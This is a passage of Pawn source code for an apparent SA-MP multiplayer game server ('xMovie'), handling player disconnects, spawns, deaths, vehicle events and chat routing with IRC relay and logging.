		SetVehicleParamsForPlayerEx(lockedveh[2], playerid, 0, 1);
		SetVehicleParamsForPlayerEx(lockedveh[3], playerid, 0, 1);
		
		//mysql_run_query(mysqlConnection, "INSERT INTO "MYSQL_TABLE_SERVER_STATISTICS" (server_statistic_date, server_statistic_connections) VALUES (CURDATE(), 1) ON DUPLICATE KEY UPDATE `server_statistic_id` = LAST_INSERT_ID(server_statistic_id), `server_statistic_connections` = server_statistic_connections +1", false, "", "");
	}
	
	/*if (mysqloffline) // mysql database if offline, protect MrPepino, spacemud, [FRAG]B
	{
		GetPlayerIp(playerid, playerip, sizeof(playerip));
		if (strfind(playername, "Pepino", true) != -1)
		{
	    	if (strfind(playerip, "85.43.", true) != 0 && strfind(playerip, "", true) != 0 && strfind(playerip, "127.0.0.1", true) != 0)
	    	{ // ip range is not same because '!= 0' it doesn't start from position 0
				format(logstring, sizeof(logstring), "Banned %s. (Reason: Don't bother stealing admin accounts.)", playername);
				SendServerMessageToAll(EMBED_RED, logstring);
				printflog("KICK-A", logstring);
				format(logstring, sizeof(logstring), "15,6Banned %s. (Reason: Don't bother stealing admin accounts.)", playername);
				IRC_GroupSay(1, IRC_CHANNEL, logstring);
				BanEx(playerid, logstring);
	    	}
		}

		else if (strfind(playername, "spacemud", true) != -1)
		{
			if (strfind(playerip, "", true) != 0 && strfind(playerip, "", true) != 0 && strfind(playerip, "", true) && strfind(playerip, "", true))
			{
				format(logstring, sizeof(logstring), "Banned %s. (Reason: Don't bother stealing admin accounts.)", playername);
				SendServerMessageToAll(EMBED_RED, logstring);
				printflog("KICK-A", logstring);
				format(logstring, sizeof(logstring), "15,6Banned %s. (Reason: Don't bother stealing admin accounts.)", playername);
				IRC_GroupSay(1, IRC_CHANNEL, logstring);
				BanEx(playerid, logstring);
	    	}
		}
		
		else if (strfind(playername, "[FRAG]B", true) != -1)
		{
			if (strfind(playerip, "", true) != 0 && strfind(playerip, "", true) != 0)
	    	{
				format(logstring, sizeof(logstring), "Banned %s. (Reason: Don't bother stealing admin accounts.)", playername);
				SendServerMessageToAll(EMBED_RED, logstring);
				printflog("KICK-A", logstring);
				format(logstring, sizeof(logstring), "15,6Banned %s. (Reason: Don't bother stealing admin accounts.)", playername);
				IRC_GroupSay(1, IRC_CHANNEL, logstring);
				BanEx(playerid, logstring);
	    	}
		}
	}*/
	return 1;
}

/*public HideInfoShowStats(playerid)
{
	//printf("\r\n[DEBUG-STUNTA] HideInfoShowStats(%d)", playerid);

	TextDrawHideForPlayer(playerid, title);
	//TextDrawHideForPlayer(playerid, info);
	TextDrawHideForPlayer(playerid, rules);
	TextDrawHideForPlayer(playerid, rules2);
	TextDrawHideForPlayer(playerid, credits);
	return 1;
}*/

public OnPlayerDisconnect(playerid, reason)
{
	//printf("\r\n[DEBUG-STUNTA] OnPlayerDisconnect(%d, %d)", playerid, reason);

 	if (IsPlayerNPC(playerid))
    return 1;

	player[playerid][cinc]++;

	if (player[playerid][playingderby] == 1)
	{
	    new vDID = GetPlayerVehicleID(playerid);
	    if (vDID) DestroyVehicle(vDID);
		RemoveDerbyPlayer(playerid, "Left server");
	} else if (player[playerid][playingrr] == 1)
	{
		RemoveRRPlayer(playerid, "Left server");
	} else if (player[playerid][playingcc] == 1)
	{
		RemoveCCPlayer(playerid, "Left server");
	} else if (player[playerid][playingnb] == 1 && player[playerid][playernbmode] == 1)
	{
		RemoveNBPlayer(playerid, "Left server");
	} else if (player[playerid][playingwarzone] == 1 && player[playerid][playerwarzonemode] == 1)
	{
		RemoveWarzonePlayer(playerid, "Left server");
	}

    new message[128];
	GetPlayerName(playerid, playername, sizeof(playername));
 	if (playerid >= MAX_PLAYERS-MAX_RESERVED_SLOTS && reason == 2)
	{
		if (!player[playerid][VIP]) format(message, sizeof(message), "%s has left the server. (Reserved slot for donators & admins)", playername);
		else format(message, sizeof(message), "%s has left the server. (%s)", playername, Disconnects[reason]);
	}
 	else format(message, sizeof(message), "%s has left the server. (%s)", playername, Disconnects[reason]);
	SendServerMessageToAll(EMBED_GREY, message);
	printflog("PART", message);

	if (player[playerid][socreated] == 1)
	{
		for (new i = 0; i < MAX_SCREEN_OBJECTS; i++)
		DestroyPlayerObject(playerid, soplayer[playerid][i]);

		player[playerid][socreated] = 0;
	}

	for (new i = 0; i < VIP_MAX_OSTICKS; i++)
	{
		if (pSObject[playerid][i][so_object] != -1)
		{
			DestroyObject(pSObject[playerid][i][so_object]);
			pSObject[playerid][i][so_object] = -1;
		}
	}

   	for (new s = 0; s < MAX_PLAYERS; s++)
	{
 		if (IsPlayerConnected(s))
		{
			if (player[s][Spectating] == 1 && player[s][SpectatingOn] == playerid)
		    {
				player[s][Spectating] = 0;
				player[s][SpectatingOn] = -1;
			    TogglePlayerSpectating(s, false);
				SpawnPlayer(s);
			}

			if (player[s][lastpm] == playerid)
			player[s][lastpm] = -1;
		}
	}

	//print("DEBUG: passed 1");
   	if (IsPlayerInAnyCrew(playerid))
 	{
  		format(strings, sizeof(strings), "[GROUP] %s has LEFT the groupchat", playername);
		new crewid = player[playerid][moviecrew];
  		SendMessageToCrew(crewid, strings);

		if (crewowner[ crewid ] == playerid)
		{
			SendMessageToCrew(crewid, "The groupchat has been automatically dropped because the owner left.");
			crews[crewid] = 0;
			crewowner[crewid] = -1;
			crewscene[crewid] = 0;
			crewshot[crewid] = 0;
			for (new i = 0; i < MAX_PLAYERS; i++)
			{
	  			if (IsPlayerConnected(i) && i != playerid)
	  			{
		  			if (player[i][moviecrew] == crewid)
		  			{
		  				player[i][moviecrew] = -1;
						player[i][chat] = 0;
					}
		  	    }
			}
		}
	}
	//print("DEBUG: passed 2");
	if (player[playerid][strew] == 1)
	{
		player[playerid][strew] = 0;
		KillTimer(player[playerid][aftimer]);
		DestroyPlayerObject(playerid, player[playerid][strewid]);
	}

	if (IsValidDynamic3DTextLabel(player[playerid][personaltext]))
	DestroyDynamic3DTextLabel(player[playerid][personaltext]);
	
	//print("DEBUG: passed 3");
	if (player[playerid][INTROtextdraw] == 1)
	{
		/*KillTimer(player[playerid][FadeTimer]);
		player[playerid][FadeTimer] = -1;
		player[playerid][FadeStep] = 0;*/
		player[playerid][FadeStepOn] = 0; // resets fade intro completely

		//TextDrawHideForPlayer(playerid, introhalloween);
		TextDrawHideForPlayer(playerid, intro1);
		//TextDrawHideForPlayer(playerid, intro2[playerid]);
		player[playerid][INTROtextdraw] = 0;
	}

	if (player[playerid][RULEStextdraw] == 1)
	TextDrawHideForPlayer(playerid, nrules);

	if (player[playerid][DONATEtextdraw] == 1)
	{
		TextDrawHideForPlayer(playerid, donatetd1);
		TextDrawHideForPlayer(playerid, donatetd2);
	}

	SendDeathMessage(INVALID_PLAYER_ID, playerid, 201);
	
	if (IsPlayerLoggedIn(playerid))
	{
	    new mysqlStr[82];
     	format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM "MYSQL_TABLE_PLAYER_LOGS" WHERE `account_id` = %d LIMIT 1", player[playerid][accountid]);
  		mysql_run_query(mysqlConnection, mysqlStr, true, "QS_LogPlayerSession", "ii", playerid, player[playerid][accountid]);

		if (player[playerid][clogged] == 1)
		{
			if (IsAdmin(playerid))
			{
				format(logstring, sizeof(logstring), "%s (id: %d) (level: %d) has logged out as admin clone.", playername, playerid, player[playerid][ADMIN]);
				printflog("LOGOUT-C", logstring);
				SendServerMessageToAdmins(EMBED_BROWN, logstring, player[playerid][ADMIN]);
				format(tmps2, sizeof(tmps2), "7,6 %s", logstring);
				IRC_GroupSay(1, IRCSOP_CHANNEL, tmps2);
			} else {
				format(logstring, sizeof(logstring), "%s (id: %d) has logged out as VIP clone.", playername, playerid);
				printflog("LOGOUT-C", logstring);
				SendServerMessageToAdmins(EMBED_BROWN, logstring, 1);
				format(tmps2, sizeof(tmps2), "7,6 %s", logstring);
				IRC_GroupSay(1, IRCSOP_CHANNEL, tmps2);
			}
		}
    } else ResetPlayerArrays(playerid);
	return 1;
}

public OnPlayerUpdate(playerid)
{
	if (player[playerid][FPStextdraw])
	{
	    // handle fps counters.
	    new drunknew;
	    drunknew = GetPlayerDrunkLevel(playerid);

	    if (drunknew < 100) // go back up, keep cycling.
		{
	        SetPlayerDrunkLevel(playerid, 2000);
	    } else {
	        if (player[playerid][DrunkLevelLast] != drunknew)
			{
	            new wfps = player[playerid][DrunkLevelLast] - drunknew;
	            if ((wfps > 0) && (wfps < 200))
	            	player[playerid][FPS] = wfps;

	            player[playerid][DrunkLevelLast] = drunknew;
	        }

	    }
	}
	player[playerid][AFKtickcount] = 0;
	return 1;
}

public OnPlayerSpawn(playerid)
{
	//printf("\r\n[DEBUG-STUNTA] OnPlayerSpawn(%d)", playerid);

    GetPlayerName(playerid, playername, sizeof(playername));

    if (IsPlayerNPC(playerid))
    {
		player[playerid][spawned] = 1;
		player[playerid][specdm] = 0;
		/*if (!strcmp(playername, "HalloweenBot1", true))
		{
			SetPlayerSkin(playerid, 168);
			SetPlayerAttachedObject(playerid, 0, 19036, 2, 0.09, 0.035, -0.005, 90.0, 80.0);
			SetPlayerPos(playerid, -1011.96, -921.51, 129.21);
			SetPlayerFacingAngle(playerid, 304.6770);
		}
		if (!strcmp(playername, "Santa", true))
		{
			SetPlayerSkin(playerid, 49);
			SetPlayerAttachedObject(playerid, VIP_MAX_POSTICKS-1, 19065, 2, 0.11, 0.013, 0.0, 30.0, 100.0, 60.0);
			SetPlayerPos(playerid, -1019.02, -927.81, 129.82);
			SetPlayerFacingAngle(playerid, 293.1144);
		}
		if (!strcmp(playername, "Jesus", true))
		{

		}
		if (!strcmp(playername, "zorro", true))
		{
			SetPlayerSkin(playerid, 59);
			SetPlayerAttachedObject(playerid, VIP_MAX_POSTICKS-1, 19065, 2, 0.17, -0.001, -0.005, 30.0, 100.0, 60.0);
			SetPlayerPos(playerid, -1013.8040, -928.5845, 129.2188);
			SetPlayerFacingAngle(playerid, 335.6603);
		}*/
		return 1;
    }

   	if (player[playerid][firstspawn] == 1)
	{
		if (IsPlayerRegistered(playerid))
		{
			if (!IsPlayerLoggedIn(playerid))
			{
				/*GetPlayerName(playerid, playername, sizeof(playername));

	 			format(strings, sizeof(strings), "Kicked %s. (Reason: Failed to login in Secured account [Code #3])", playername);
				SendServerMessageToAll(EMBED_RED, strings);
				printflog("KICK-A", strings);
				format(tmps2, sizeof(tmps2), "8,1%s", strings);
				IRC_GroupSay(1, IRC_CHANNEL, tmps2);
				KickEx(playerid);

				new mysqlStr[130];
		        format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PLAYER_LOGS" SET `player_log_kick_count` = player_log_kick_count +1 WHERE `account_id` = %d LIMIT 1", GetPlayerAccountID(playerid));
	      		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
				return 1;*/
				
				// do nothing, force player to login otherwise kick will follow automatically
				TogglePlayerControllable(playerid, 0);
			} else { // logged in
				//do stuff like set skin from mysql db
			    ShowPlayerDialog(playerid, DIALOGID_SPAWN, DIALOG_STYLE_MSGBOX, "xMovie Server Rules", serverrules, "spawn 1", "spawn 2");
			}
		} else { // is not registered
		    ShowPlayerDialog(playerid, DIALOGID_SPAWN, DIALOG_STYLE_MSGBOX, "xMovie Server Rules", serverrules, "spawn 1", "spawn 2");
		}
		SetPlayerColor(playerid, PlayerColors[random(sizeof(PlayerColors))]);
	}
	
	if (player[playerid][socreated] == 1)
	{
		for (new i = 0; i < MAX_SCREEN_OBJECTS; i++)
		DestroyPlayerObject(playerid, soplayer[playerid][i]);

		player[playerid][socreated] = 0;
	}

	if (player[playerid][INTROtextdraw] == 1)
	{
		/*KillTimer(player[playerid][FadeTimer]);
		player[playerid][FadeTimer] = -1;
		player[playerid][FadeStep] = 0;*/
		player[playerid][FadeStepOn] = 0; // resets fade intro completely

		//TextDrawHideForPlayer(playerid, introhalloween);
		TextDrawHideForPlayer(playerid, intro1);
		//TextDrawHideForPlayer(playerid, intro2[playerid]);
		player[playerid][INTROtextdraw] = 0;
	}

	if (player[playerid][RULEStextdraw] == 1)
	{
		TextDrawHideForPlayer(playerid, nrules);
		player[playerid][RULEStextdraw] = 0;
	}

	if (player[playerid][DONATEtextdraw] == 1)
	{
		TextDrawHideForPlayer(playerid, donatetd1);
		TextDrawHideForPlayer(playerid, donatetd2);
		player[playerid][DONATEtextdraw] = 0;
	}
	
	player[playerid][spawned] = 1;
	player[playerid][specdm] = 0;

	TogglePlayerControllable(playerid, 1);
	ClearAnimations(playerid);
	GivePlayerMoney(playerid, 10000);
	SetPlayerTime(playerid, stime, 00);
	SetPlayerWeather(playerid, sweather);
	SetPlayerTeam(playerid, playerid);

	if (player[playerid][afk] > 0)
	{
		SetPlayerPos(playerid,154.0770, -1951.9774, 47.8750);
		SetPlayerFacingAngle(playerid, 0);
		GetPlayerName(playerid, playername, sizeof(playername));
		format(strings, sizeof(strings), "%s's AFK status was restored", playername);
	    SendServerMessageToAll(EMBED_DARKRED, strings);
	    return 1;
	}

	if (player[playerid][jailed] == 1)
	{
		SetPlayerPos(playerid,154.0770, -1951.9774, 47.8750);
		SetPlayerFacingAngle(playerid, 0);
		GetPlayerName(playerid, playername, sizeof(playername));
		format(strings, sizeof(strings), "%s's prisoner status was restored", playername);
	    SendServerMessageToAll(EMBED_DARKRED, strings);
	    return 1;
	}

    if (!IsPlayerInDMSPJA(playerid))
	SetTimerEx("ReloadStickedObjects", 500, 0, "i", playerid);
	
	for (new poi = 0; poi < VIP_MAX_POSTICKS; poi++)
	{
	    if (pAObject[playerid][poi][ao_model] == -1)
	    continue;
	    
	    SetPlayerAttachedObject(playerid, poi, pAObject[playerid][poi][ao_model], pAObject[playerid][poi][ao_bone], pAObject[playerid][poi][ao_x], pAObject[playerid][poi][ao_y], pAObject[playerid][poi][ao_z], pAObject[playerid][poi][ao_rx], pAObject[playerid][poi][ao_ry], pAObject[playerid][poi][ao_rz], pAObject[playerid][poi][ao_sx], pAObject[playerid][poi][ao_sy], pAObject[playerid][poi][ao_sz]);
	}

	if (playerxyzaiv[playerid][0][0] != -1 && playerxyzaiv[playerid][0][1] != -1 && playerxyzaiv[playerid][0][2] != -1 && playerxyzaiv[playerid][0][3] != -1)
	{
	    SetPlayerPos(playerid, playerxyzaiv[playerid][0][0], playerxyzaiv[playerid][0][1], playerxyzaiv[playerid][0][2]);
	    SetPlayerFacingAngle(playerid, playerxyzaiv[playerid][0][3]);
     	SetPlayerInterior(playerid, player[playerid][interior]);
    	SetPlayerVirtualWorld(playerid, player[playerid][virtualworld]);
		SetCameraBehindPlayer(playerid);
	    return 1;
	}

	switch(player[playerid][pspawnid])
	{
		case -1:
		{
			/*if (random(50) > 24)
			{
				new Rand = random(sizeof(MSpawnPos));
			 	SetPlayerPos(playerid, MSpawnPos[Rand][0], MSpawnPos[Rand][1], MSpawnPos[Rand][2]);
				SetPlayerFacingAngle(playerid, MSpawnPos[Rand][3]);
			} else {
				new Rand = random(sizeof(M2SpawnPos));
				SetPlayerPos(playerid, M2SpawnPos[Rand][0], M2SpawnPos[Rand][1], M2SpawnPos[Rand][2]);
				SetPlayerFacingAngle(playerid, M2SpawnPos[Rand][3]);
			}*/

			if (!IsPlayerNPC(playerid)) SetPlayerVirtualWorld(playerid, WORLDID_ASSIGNSPAWN);
			SetPlayerPos(playerid, 154.0770, -1951.9774, 47.8750);
			SetPlayerFacingAngle(playerid, 0);
		}
		case 0:
		{
		 	SetPlayerVirtualWorld(playerid, WORLDID_DEFAULT);
			new Rand = random(sizeof(MSpawnPos));
		 	SetPlayerPos(playerid, MSpawnPos[Rand][0], MSpawnPos[Rand][1], MSpawnPos[Rand][2]);
			SetPlayerFacingAngle(playerid, MSpawnPos[Rand][3]);
		}
		case 1:
		{
		 	SetPlayerVirtualWorld(playerid, WORLDID_DEFAULT);
			new Rand = random(sizeof(M2SpawnPos));
			SetPlayerPos(playerid, M2SpawnPos[Rand][0], M2SpawnPos[Rand][1], M2SpawnPos[Rand][2]);
			SetPlayerFacingAngle(playerid, M2SpawnPos[Rand][3]);
		}
	}
 	SetPlayerInterior(playerid, 0);
	SetCameraBehindPlayer(playerid);
	return 1;
}

public OnPlayerGiveDamage(playerid, damagedid, Float: amount, weaponid)
{
    return 1;
}

public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid)
{
    return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
	//printf("\r\n[DEBUG-STUNTA] OnPlayerDeath(%d, %d, %d)", playerid, killerid, reason);

	//ResetPlayerMoney(playerid);

	/*if (!IsPlayerInAnyVehicle(playerid))
	ClearAnimations(playerid);*/
	
	ResetBounds(playerid);
	player[playerid][spawned] = 0;
	player[playerid][playingdm] = 0;
	SendDeathMessage(killerid, playerid, reason);

	if (player[playerid][playingderby] == 1 && derbysecondsleft <= 5)
	{
	    new vDID = GetPlayerVehicleID(playerid);
	    if (vDID) DestroyVehicle(vDID);
		RemoveDerbyPlayer(playerid, "Died");
	} else if (player[playerid][playingcc] == 1)
	{
	    /*new reasonMsg[75];
	    if (killerid == INVALID_PLAYER_ID) // gets bugged when using killerid??
	    {
			format(reasonMsg, sizeof(reasonMsg), "Died lonely because of %s", aWeaponNames[reason]);
		} else {
			GetPlayerName(killerid, giveplayername, sizeof(giveplayername));
			format(reasonMsg, sizeof(reasonMsg), "Killed by %s with %s", giveplayername, aWeaponNames[reason]);
	    }
	    RemoveCCPlayer(playerid, reasonMsg);*/
		RemoveCCPlayer(playerid, "Killed in action");
	} else if (player[playerid][playingwarzone] == 1 && player[playerid][playerwarzonemode] == 1)
	{
	    /*new reasonMsg[75];
	    if (killerid == INVALID_PLAYER_ID) // gets bugged when using killerid??
	    {
			format(reasonMsg, sizeof(reasonMsg), "Died lonely because of %s", aWeaponNames[reason]);
		} else {
			GetPlayerName(killerid, giveplayername, sizeof(giveplayername));
			format(reasonMsg, sizeof(reasonMsg), "Killed by %s with %s", giveplayername, aWeaponNames[reason]);
	    }
	    RemoveWarzonePlayer(playerid, reasonMsg);*/
		RemoveWarzonePlayer(playerid, "Killed in action");
	}

   	for (new s = 0; s < MAX_PLAYERS; s++)
	{
	    if (IsPlayerConnected(s) && player[s][Spectating] == 1 && player[s][SpectatingOn] == playerid)
	    {
			player[s][Spectating] = 0;
			player[s][SpectatingOn] = -1;
			TogglePlayerSpectating(s, false);
			SpawnPlayer(s);
		}
	}

	for (new i = 0; i < VIP_MAX_OSTICKS; i++) // gets removed on death (desync) but re-attach shit manually on respawn
	{
        if (pSObject[playerid][i][so_object] != -1)
        {
			DestroyObject(pSObject[playerid][i][so_object]);
			pSObject[playerid][i][so_object] = -1;
		}
	}

	/*for (new i = 0; i < VIP_MAX_OSTICKS; i++) // gets removed on death but re-attach shit manually on respawn
	{
	    if (pSObject[playerid][i][so_model] != -1)
	    {
	        if (pSObject[playerid][i][so_object] != -1)
			DestroyObject(pSObject[playerid][i][so_object]);
			
			pSObject[playerid][i][so_object]		= -1;
			pSObject[playerid][i][so_model] 		= -1;
			pSObject[playerid][i][so_isvehicle]		= 0;
			pSObject[playerid][i][so_vehiclemodel]	= 0;
			pSObject[playerid][i][so_x]         	= 0.0;
			pSObject[playerid][i][so_y]         	= 0.0;
			pSObject[playerid][i][so_z]         	= 0.0;
			pSObject[playerid][i][so_rx]        	= 0.0;
			pSObject[playerid][i][so_ry]        	= 0.0;
			pSObject[playerid][i][so_rz]        	= 0.0;
		}
	}
	player[playerid][ostickc] = 0;*/

	/*for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++) // gets automatically removed on death but re-attach shit manually on respawn
	{
		if (IsPlayerAttachedObjectSlotUsed(playerid, pi))
		{
			//RemovePlayerAttachedObject(playerid, pi);
			pAObject[playerid][pi][ao_model]	= -1;
			pAObject[playerid][pi][ao_bone]		= 0;
			pAObject[playerid][pi][ao_x]		= 0.0;
			pAObject[playerid][pi][ao_y]		= 0.0;
			pAObject[playerid][pi][ao_z]		= 0.0;
			pAObject[playerid][pi][ao_rx]		= 0.0;
			pAObject[playerid][pi][ao_ry]		= 0.0;
			pAObject[playerid][pi][ao_rz]		= 0.0;
			pAObject[playerid][pi][ao_sx]		= 1.0;
			pAObject[playerid][pi][ao_sy]		= 1.0;
			pAObject[playerid][pi][ao_sz]		= 1.0;
		}
	}
	player[playerid][postickc] = 0;*/

	GetPlayerName(playerid, playername, sizeof(playername));
	if (player[playerid][suicide] == 1 || killerid == INVALID_PLAYER_ID)
	{
		player[playerid][suicide] = 0;
		format(logstring, sizeof(logstring), "%s killed himself", playername);
		
		//mysql_run_query(mysqlConnection, "INSERT INTO "MYSQL_TABLE_SERVER_STATISTICS" (server_statistic_date, server_statistic_deaths) VALUES (CURDATE(), 1) ON DUPLICATE KEY UPDATE `server_statistic_id` = LAST_INSERT_ID(server_statistic_id), `server_statistic_deaths` = server_statistic_deaths +1", false, "", "");
	} else {
		GetPlayerName(killerid, giveplayername, sizeof(giveplayername));
		format(logstring, sizeof(logstring), "%s killed %s (%s)", giveplayername, playername, aWeaponNames[reason]);
		
		//mysql_run_query(mysqlConnection, "INSERT INTO "MYSQL_TABLE_SERVER_STATISTICS" (server_statistic_date, server_statistic_deaths, server_statistic_kills) VALUES (CURDATE(), 1, 1) ON DUPLICATE KEY UPDATE `server_statistic_id` = LAST_INSERT_ID(server_statistic_id), `server_statistic_deaths` = server_statistic_deaths +1, `server_statistic_kills` = server_statistic_kills +1", false, "", "");
	}
	printflog("KILL", logstring);
	return 1;
}

public OnVehicleSpawn(vehicleid)
{
	//printf("\r\n[DEBUG-STUNTA] OnVehicleSpawn(%d)", vehicleid);

	if (vehicleid == andromadavehicleid)
	{
		for (new a = 0; a < MAX_PLAYERS; a++)
	 	{
	    	if (IsPlayerConnected(a) && player[a][InAndromada] != -1)
	    	{
				SetPlayerArmour(a, 0.0);
				SetPlayerHealth(a, 0.0);
				player[a][InAndromada] = -1;
       			if (andromadacheckpoint == true)
				DisablePlayerRaceCheckpoint(a);
			}
		}
		andromadacheckpoint = false;
		andromadavehicleid = -1;
	}
	
	if (vehicleid >= GAMEMODE_VEHICLES)
	{
		vehicle[vehicleid][Owner] = -1;
		vehicle[vehicleid][Objective] = 0;
		vehicle[vehicleid][Locked] = 0;
	}
	return 1;
}

public OnVehicleDeath(vehicleid, killerid)
{
	//printf("\r\n[DEBUG-STUNTA] OnVehicleDeath(%d, %d)", vehicleid, killerid);

	if (GetVehicleModel(vehicleid) == 519)
	{
		CreateExplosion(1.7540, 24.4852, 1199.5938, 10, 25.0);
		for (new a = 0; a < MAX_PLAYERS; a++)
	 	{
	    	if (IsPlayerConnected(a) && player[a][InShamal] != -1)
	    	{
				SetPlayerArmour(a, 0.0);
				SetPlayerHealth(a, 0.0);
				player[a][InShamal] = -1;
			}
		}
	}
	if (vehicleid == andromadavehicleid)
	{
		for (new a = 0; a < MAX_PLAYERS; a++)
	 	{
	    	if (IsPlayerConnected(a) && player[a][InAndromada] != -1)
	    	{
				SetPlayerArmour(a, 0.0);
				SetPlayerHealth(a, 0.0);
				player[a][InAndromada] = -1;
       			if (andromadacheckpoint == true)
				DisablePlayerRaceCheckpoint(a);
			}
		}
		andromadacheckpoint = false;
		andromadavehicleid = -1;
	}

	if (vehicleid == currentccvehicle)
	{
		SetTimerEx("DestroyVehicleEx", 5000, 0, "i", vehicleid);
	    currentccvehicle = -1;
	}
	
	if (vehicleid >= GAMEMODE_VEHICLES)
	{
		vehicle[vehicleid][Owner] = -1;
		vehicle[vehicleid][Objective] = 0;
		vehicle[vehicleid][Locked] = 0;
	}
	return 1;
}

public OnPlayerText(playerid, text[])
{
   	//printf("\r\n[DEBUG-STUNTA] OnPlayerText(%d, %s)", playerid, text);

    /*new i,
        c;
    while ((c = text[i++])) if (c < 0x20 || c > 0x7E) return 0; // Check for illegal characters.
    // Your now safe native functions*/

	GetPlayerName(playerid, playername, sizeof(playername));

	if (IsPlayerMuted(playerid))
	{
		SendErrorMessage(playerid, EMBED_RED, "* You are muted *");
		format(logstring, sizeof(logstring), "%s: %s", playername, text);
		printflog("CHAT-M", logstring);
		return 0;
	}

	if (!IsAdmin(playerid))
	SpamProtection(playerid, "Chat");

	switch(text[0])
	{
		case '!':
		{
			if (IsPlayerInAnyCrew(playerid))
			{
			    if (player[playerid][moviecrew] < MAX_GROUPS-3)
			    {
					format(strings, sizeof(strings), "[G%d] %s: %s", player[playerid][moviecrew], playername, text[1]);
					format(ircstring, sizeof(ircstring), "02[%d] 05[G%d] %s: %s", playerid, player[playerid][moviecrew], playername, text[1]);
				} else {
			        if (player[playerid][playingcc] == 1)
			        {
						format(strings, sizeof(strings), "[RADIO] %s: %s", playername, text[1]);
						format(ircstring, sizeof(ircstring), "02[%d] 05[RADIO] %s: %s", playerid, playername, text[1]);
					} else {
						format(strings, sizeof(strings), "[TEAM] %s: %s", playername, text[1]);
						format(ircstring, sizeof(ircstring), "02[%d] 05[TEAM] %s: %s", playerid, playername, text[1]);
					}
				}
				SendMessageToCrew(player[playerid][moviecrew], strings);
				IRC_GroupSay(1, IRCOP_CHANNEL, ircstring);

				format(logstring, sizeof(logstring), "%s: %s", playername, text[1]);
				printflog("CHAT-G", logstring);
				return 0;
			}
		}
		case '@':
		{
			if (IsVIP(playerid))
			{
				format(strings, sizeof(strings), "[VIP] %s: %s",playername, text[1]);
				SendMessageToVIPs(COLOR_GREENYELLOW, strings);

				format(ircstring, sizeof(ircstring), "02[%d] 10[VIP] %s: %s", playerid, playername, text[1]);
				IRC_GroupSay(1, IRCHOP_CHANNEL, ircstring);

				format(logstring, sizeof(logstring), "%s: %s", playername, text[1]);
				printflog("CHAT-V", logstring);
				return 0;
			}
		}
		case '#':
		{
			if (IsAdmin(playerid))
			{
				format(strings, sizeof(strings), "[ADMIN] %s: %s",playername, text[1]);
				SendMessageToAdmins(COLOR_RED, strings, 1);

				format(ircstring, sizeof(ircstring), "02[%d] 04[ADMIN] %s: %s", playerid, playername, text[1]);
				IRC_GroupSay(1, IRCOP_CHANNEL, ircstring);

				format(logstring, sizeof(logstring), "%s: %s", playername, text[1]);
				printflog("CHAT-A", logstring);
				return 0;
			}
		}
		case '&':
		{
			if (IsPlayerAdminLevel(playerid, 5))
			{
				format(strings, sizeof(strings), "[ADMIN5] %s: %s",playername, text[1]);
				SendMessageToAdmins(COLOR_LPINK, strings, 5);

				format(ircstring, sizeof(ircstring), "02[%d] 13[ADMIN5] %s: %s", playerid, playername, text[1]);
				IRC_GroupSay(1, IRCQOP_CHANNEL, ircstring);

				format(logstring, sizeof(logstring), "%s: %s", playername, text[1]);
				printflog("CHAT-A5", logstring);
				return 0;
			}
		}
		
		default:
		{
			new pWorld,
			    pGroup;
			    
			if (mutedchat == true && !IsAdmin(playerid))
			{
				SendErrorMessage(playerid, EMBED_RED, "The global chat has been muted.");
				return 0;
			}

			else if (acolour == true && player[playerid][pcolour] != 0)
			{
			   	new message[135];
				if (player[playerid][pcolour] == 1) format(message, sizeof(message), "{%s}%s", PlayerColors2[random(sizeof(PlayerColors2))], ColouredText(text));
				else format(message, sizeof(message), "%s%s", colorInfo2[ player[playerid][pcolour] ], ColouredText(text));

		     	SendPlayerMessageToAll(playerid, message);
		     	
				format(ircstring, sizeof(ircstring), "02[%d]07 %s: %s", playerid, playername, text);
				IRC_GroupSay(1, IRC_CHANNEL, ircstring);

				format(logstring, sizeof(logstring), "%s: %s", playername, text[1]);
				printflog("CHAT-C", logstring);
				return 0;
			}

			else if (colouredchat == true)
			{
			    new textStr[128];
				format(textStr, sizeof(textStr), "%s: %s", playername, text);
		   		SendClientMessageToAll(GetPlayerColor(playerid), textStr);
		   		
				format(ircstring, sizeof(ircstring), "02[%d]07 %s: %s", playerid, playername, text);
				IRC_GroupSay(1, IRC_CHANNEL, ircstring);
				
				format(logstring, sizeof(logstring), "%s: %s", playername, text[1]);
				printflog("CHAT-C", logstring);
		   		return 0;
			}
			
			else if (player[playerid][chat] == 0) // public
			{
			    pWorld = GetPlayerVirtualWorld(playerid);
			    pGroup = player[playerid][moviecrew];
				for (new pID = 0; pID < MAX_PLAYERS; pID++)
				{
				    if (IsPlayerConnected(pID))
				    {
						if (player[pID][chat] == 0 || player[pID][chat] == 1 && GetPlayerVirtualWorld(pID) == pWorld || player[pID][chat] == 2 && IsPlayerStreamedIn(playerid, pID))
						SendPlayerMessageToPlayer(pID, playerid, text);
					}
				}
				
				format(ircstring, sizeof(ircstring), "02[%d]07 %s: %s", playerid, playername, text);
				IRC_GroupSay(1, IRC_CHANNEL, ircstring);
				
				format(logstring, sizeof(logstring), "%s: %s", playername, text);
				printflog("CHAT", logstring);
			} else if (player[playerid][chat] == 1) // world
			{
				pWorld = GetPlayerVirtualWorld(playerid);
				for (new pID = 0; pID < MAX_PLAYERS; pID++)
				{
			        if (IsPlayerConnected(pID))
			        {
						if (GetPlayerVirtualWorld(pID) == pWorld && player[pID][chat] != 3)
				    	SendPlayerMessageToPlayer(pID, playerid, text);
					}
				}
				
				format(ircstring, sizeof(ircstring), "02[%d]07 %s: %s", playerid, playername, text);
				IRC_GroupSay(1, IRC_CHANNEL, ircstring);
				
				format(logstring, sizeof(logstring), "%s: %s", playername, text);
				printflog("CHAT-W", logstring);
			} else if (player[playerid][chat] == 2) // local
			{
			    SendPlayerMessageToPlayer(playerid, playerid, text);
				for (new pID = 0; pID < MAX_PLAYERS; pID++)
				{
					if (IsPlayerConnected(pID))
					{
						if (IsPlayerStreamedIn(playerid, pID) && player[pID][chat] != 3)
				    	SendPlayerMessageToPlayer(pID, playerid, text);
					}
				}
				
				format(ircstring, sizeof(ircstring), "02[%d]07 %s: %s", playerid, playername, text);
				IRC_GroupSay(1, IRC_CHANNEL, ircstring);
				
				format(logstring, sizeof(logstring), "%s: %s", playername, text);
				printflog("CHAT-L", logstring);
